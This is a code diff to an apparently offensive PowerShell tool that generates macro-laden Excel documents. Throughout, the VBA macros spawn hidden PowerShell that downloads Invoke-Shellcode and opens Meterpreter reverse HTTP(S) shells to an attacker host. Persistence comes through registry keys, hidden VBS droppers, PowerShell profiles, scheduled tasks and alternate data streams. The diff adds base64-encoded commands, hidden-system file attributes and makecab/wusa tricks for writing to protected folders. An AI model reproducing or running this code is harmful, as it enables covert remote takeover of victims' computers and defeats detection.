@@ -66,6 +66,9 @@ $global:Name = Read-Host "Enter the name of the document (Do not include a file 
 $global:Name = $global:Name + ".xls"
 $global:FullName = "$global:defLoc\$global:Name"
 
+
+     
+
 function Registry-Persistence {
 <#
 .SYNOPSIS
@@ -84,7 +87,7 @@ Start
 
 End Sub
 
- Public Function Execute() As Variant
+Public Function Execute() As Variant
         Const HIDDEN_WINDOW = 0
         strComputer = "."
         Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
@@ -93,23 +96,32 @@ End Sub
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
-     End Function
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -e $EncodedCommand", Null, objConfig, intProcessID
+End Function
      
 Public Function Persist() As Variant
- Set fs = CreateObject("Scripting.FileSystemObject")
-    Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
+
+On Error Resume Next
+    SetAttr "C:\Users\Public\config.txt", vbNormal
+    SetAttr "C:\Users\Public\config.vbs", vbNormal
+    Kill "C:\Users\Public\config.*"
+On Error GoTo 0
+
+Set fs = CreateObject("Scripting.FileSystemObject")
+Set a = fs.CreateTextFile("C:\Users\Public\config.txt", True)
     a.WriteLine ("Dim objShell")
     a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
-    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force""")
+    a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -e $EncodedCommand""")
     a.WriteLine ("objShell.Run command,0")
     a.WriteLine ("Set objShell = Nothing")
     a.Close
-    GivenLocation = "C:\Users\Public\"
-    OldFileName = "config.txt"
-    NewFileName = "config.vbs"
-    Name GivenLocation & OldFileName As GivenLocation & NewFileName
-    SetAttr "C:\Users\Public\config.vbs", vbHidden
+
+GivenLocation = "C:\Users\Public\"
+OldFileName = "config.txt"
+NewFileName = "config.vbs"
+Name GivenLocation & OldFileName As GivenLocation & NewFileName
+SetAttr "C:\Users\Public\config.vbs", vbHidden + vbSystem
+
 End Function
 
 Public Function Reg() As Variant
@@ -184,8 +196,6 @@ Write-Host "[*]Successfully Removed Malicious Load entry from HKCU\Software\Micr
 '@
 Add-Content $env:userprofile\Desktop\RegistryCleanup.ps1 $RegistryCleanup
 Write-Host "Clean-up Script located at $env:userprofile\Desktop\RegistryCleanup.ps1"
-
-
 }
 
 function PowerShellProfile-Persistence{
@@ -214,12 +224,13 @@ Public Function Execute() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
-     End Function
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -e $EncodedCommand", Null, objConfig, intProcessID
+End Function
 
 Public Function WriteWrapper() As Variant
+
 Set fs = CreateObject("Scripting.FileSystemObject")
-    Set a = fs.CreateTextFile("C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.txt", True)
+    Set a = fs.CreateTextFile("C:\Users\Public\cookie.vbs", True)
     a.WriteLine ("Dim objShell")
     a.WriteLine ("Set objShell = WScript.CreateObject(""WScript.Shell"")")
     a.WriteLine ("command = ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe""")
@@ -227,23 +238,70 @@ Set fs = CreateObject("Scripting.FileSystemObject")
     a.WriteLine ("Set objShell = Nothing")
     a.Close
     GivenLocation = "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\"
-    OldFileName = "cookie.txt"
-    NewFileName = "cookie.vbs"
-    Name GivenLocation & OldFileName As GivenLocation & NewFileName
-    SetAttr "C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\cookie.vbs", vbHidden
+        
+    Const HIDDEN_WINDOW = 0
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+       
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = HIDDEN_WINDOW
+    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        
+    objProcess.Create "cmd /c makecab C:\Users\Public\cookie.vbs c:\Users\Public\Cookie.tmp", Null, objConfig, intProcessID
+    objProcess.Create "cmd /c wusa c:\Users\Public\Cookie.tmp /extract:C:\Users\Default\AppData\Roaming\Microsoft\Windows\Cookies\", Null, objConfig, intProcessID
+    
+    Set colMonitoredProcesses = objWMIService. _
+    ExecNotificationQuery("select * From __InstanceDeletionEvent " _
+        & " within 1 where TargetInstance isa 'Win32_Process'")
+
+    Do While True
+        Set objLatestProcess = colMonitoredProcesses.NextEvent
+        If objLatestProcess.TargetInstance.ProcessID = intProcessID Then
+            Exit Do
+        End If
+    Loop
+    
+    On Error Resume Next
+        Kill "C:\Users\Public\Cookie.*"
+    On Error GoTo 0
 
 End Function
 
 Public Function WriteProfile() As Variant
-Set fs = CreateObject("Scripting.FileSystemObject")
-    Set a = fs.CreateTextFile("C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.txt", True)
-    a.WriteLine ("IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force")
+    Set fs = CreateObject("Scripting.FileSystemObject")
+    Set a = fs.CreateTextFile("C:\Users\Public\Profile.ps1", True)
+    a.WriteLine ("`$Ecmd = '$EncodedCommand'")
+    a.WriteLine ("invoke-expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$Ecmd)))")
     a.Close
-    GivenLocation = "C:\Windows\SysNative\WindowsPowerShell\v1.0\"
-    OldFileName = "Profile.txt"
-    NewFileName = "Profile.ps1"
-    Name GivenLocation & OldFileName As GivenLocation & NewFileName
-    SetAttr "C:\Windows\SysNative\WindowsPowerShell\v1.0\Profile.ps1", vbHidden
+
+    Const HIDDEN_WINDOW = 0
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+       
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = HIDDEN_WINDOW
+    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        
+    objProcess.Create "cmd /c makecab C:\Users\Public\Profile.ps1 c:\Users\Public\Profile.tmp", Null, objConfig, intProcessID
+    objProcess.Create "cmd /c wusa c:\Users\Public\Profile.tmp /extract:C:\Windows\System32\WindowsPowerShell\v1.0", Null, objConfig, intProcessID
+    
+    Set colMonitoredProcesses = objWMIService. _
+    ExecNotificationQuery("select * From __InstanceDeletionEvent " _
+        & " within 1 where TargetInstance isa 'Win32_Process'")
+
+    Do While True
+        Set objLatestProcess = colMonitoredProcesses.NextEvent
+        If objLatestProcess.TargetInstance.ProcessID = intProcessID Then
+            Exit Do
+        End If
+    Loop
+
+    On Error Resume Next
+        Kill "C:\Users\Public\Profile.*"
+    On Error GoTo 0
+    
 End Function
 
 Public Function Reg() As Variant
@@ -321,7 +379,7 @@ Write-Host "Clean-up Script located at $env:userprofile\Desktop\PowerShellProfil
 
 function SchTaskPersistence{
 $TimeDelay = Read-Host "Enter User Idle Time before the task runs"
-$TaskName = Read-Host "Enter the name you want the task to be called"
+$TaskName = Read-Host "Enter the name you want the task to be called (no spaces)"
 $Code = @"
 'Coded by Matt Nelson
 'twitter.com/enigma0x3
@@ -344,9 +402,8 @@ Public Function Execute() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
-     End Function
-
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -e $EncodedCommand", Null, objConfig, intProcessID
+End Function
 
 Public Function Persist() As Variant
         Const HIDDEN_WINDOW = 0
@@ -357,7 +414,7 @@ Public Function Persist() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "Powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -ep Bypass -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force' /SC onidle /i $TimeDelay}", Null, objConfig, intProcessID
+        objProcess.Create "Powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c Invoke-Command -ScriptBlock { schtasks /create  /TN $TaskName /TR 'powershell.exe -ep Bypass -WindowStyle hidden -noexit -c ''IEX ((New-Object Net.WebClient).DownloadString(''''$global:IS_Url''''''))''; Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force' /SC ONIDLE /i $TimeDelay}", Null, objConfig, intProcessID
      End Function
 
 
@@ -440,8 +497,8 @@ Public Function Execute() As Variant
         Set objConfig = objStartup.SpawnInstance_
         objConfig.ShowWindow = HIDDEN_WINDOW
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force", Null, objConfig, intProcessID
-     End Function
+        objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -e $EncodedCommand", Null, objConfig, intProcessID
+End Function
 	 
 Public Function ADSPersist() As Variant
         Const HIDDEN_WINDOW = 0
@@ -454,11 +511,7 @@ Public Function ADSPersist() As Variant
         Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
         objProcess.Create "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c IEX ((New-Object Net.WebClient).DownloadString('$AltDSURL')); Invoke-ADSBackdoor -URL $global:IS_Url -Arguments 'Invoke-Shellcode -Payload $Payload -LHost $global:IP -LPort $global:Port -Force'", Null, objConfig, intProcessID
      End Function
-
-
-
 "@
-
 
 
 #Create excel document
@@ -475,7 +528,6 @@ $Excel01.DisplayAlerts = "wdAlertsNone"
 $Excel01.Visible = $false
 $Workbook01 = $Excel01.Workbooks.Add(1)
 $Worksheet01 = $Workbook01.WorkSheets.Item(1)
-
 
 
 $ExcelModule = $Workbook01.VBProject.VBComponents.Add(1)
@@ -639,8 +691,12 @@ $Payload = "windows/meterpreter/reverse_https"}
 elseif($PayloadNum -eq "2"){
 $Payload = "windows/meterpreter/reverse_http"}
 
-#Initiate Attack Choice
+# Encode execute command
+$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+$Command = "IEX ((New-Object Net.WebClient).DownloadString('$global:IS_Url')); Invoke-Shellcode -Payload $Payload -Lhost $global:IP -Lport $global:Port -Force"
+$EncodedCommand = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($Command))
 
+#Initiate Attack Choice
 if($AttackNum -eq "1"){
     Registry-Persistence}
 elseif($AttackNum -eq "2"){
